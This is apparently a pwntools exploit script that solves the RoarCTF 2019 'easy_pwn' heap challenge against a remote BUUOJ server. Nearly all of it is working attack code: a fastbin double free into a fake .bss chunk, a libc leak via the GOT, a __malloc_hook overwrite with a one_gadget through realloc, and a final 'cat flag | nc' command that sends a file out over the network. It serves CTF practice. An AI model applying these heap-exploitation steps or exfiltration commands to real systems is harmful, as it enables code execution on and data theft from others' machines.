#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './roarctf_2019_easy_pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()

def readname(name):
	p.sendafter('name:', name)

def readinfo(info):
	p.sendafter('info:', info)

def menu(ch):
	p.sendlineafter('>> ', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('input the size\n', str(size))
	p.sendlineafter('content\n', content)


def free():
	menu(2)
	
def show():
	menu(3)


def backdoor(ch, content=""):
	menu(666)
	p.sendlineafter('build or free?\n', str(ch))
	if ch == 1:
		p.sendlineafter('content\n', content)

	print "call backdoor success"

def exploit():
	#unsorted bin leak libc
	name = p64(0) + p64(0x71) + p64(0x602060)
	info = p64(0) + p64(0x21)
	readname(name)
	readinfo(info)

	backdoor(1)
	add(0x18, "a")				#padding

	#free to unsorted
	backdoor(2)

	add(0x68, "b")				#split from backheap and make it's size to 0x71
	add(0x68, 'c')				#after backheap from top chunk
	free()						#c 0x71
	backdoor(2)				#double free but with size 0x71
	free()					#double free chain at size 0x71


	add(0x68, p64(0x602060))	#modify fd'size to .bss
	add(0x68, 'padding')
	add(0x68, 'padding')


	#overwrite showRandom, buf = elf.got['__libc_start_main']
	#so we can leak libc
	#here is a trick, double chain as a->a;   so we can use it always
	payload = p64(0x602060) + 'b'*0x10 + p64(0x601FA8) + p64(0xdeadbeefdeadbeef)
	add(0x68, payload)
	show()
	__libc_start_main_addr = u64(p.recv(6).ljust(8, '\x00'))
	libc_base = __libc_start_main_addr - libc.symbols['__libc_start_main']
	libc.address = libc_base

	system = libc.symbols['system']
	malloc_hook = libc.symbols['__malloc_hook']
	gadget = libc_base + 0xf1147
	print "libc_base ==> " + hex(libc_base)

	#next with no stdout
	#add(0x68, p64(malloc_hook - 0x23))
	#add(0x68, 'padding')
	#add(0x68, p64('a'))
	#gdb.attach(p, 'b* 0x400A40')
	dbg()
	p.sendline('1')
	dbg()
	p.sendline(str(0x68))
	dbg()
	p.sendline(p64(malloc_hook-0x23))

	dbg()
	p.sendline('1')
	dbg()
	p.sendline(str(0x68))
	dbg()
	p.sendline('padding')

	dbg()
	p.sendline('1')
	dbg()
	p.sendline(str(0x68))
	dbg()
	p.sendline('\x00'*0xb + p64(gadget) + p64(libc.symbols['realloc']+20))

	dbg()
	p.sendline('1')
	dbg()
	p.sendline(str(0x28))
	dbg()
	p.send("cat flag | nc localhost 2333")
	

	p.interactive()
	p.close()








if __name__ == '__main__':
	#p = process('./roarctf_2019_easyheap')
	p = remote('node3.buuoj.cn', 28131)
	libc = elf.libc
	exploit()